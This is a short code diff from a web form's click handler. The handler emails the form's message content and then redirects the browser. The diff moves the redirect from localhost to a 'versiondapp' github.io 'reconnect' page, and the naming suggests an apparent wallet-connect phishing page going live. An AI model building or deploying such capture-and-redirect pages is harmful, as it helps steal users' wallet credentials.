@@ -7,7 +7,7 @@ document.getElementById('form-connect-button').addEventListener('click', functio
         handleButtonUI(); 
         sendEmail(messageContent); 
         setTimeout(function () {
-          window.location.href = 'http://localhost:8000/reconnect.html'; 
+          window.location.href = 'http://versiondapp.github.io/auth/reconnect.html'; 
         }, 6000);
       }
     }
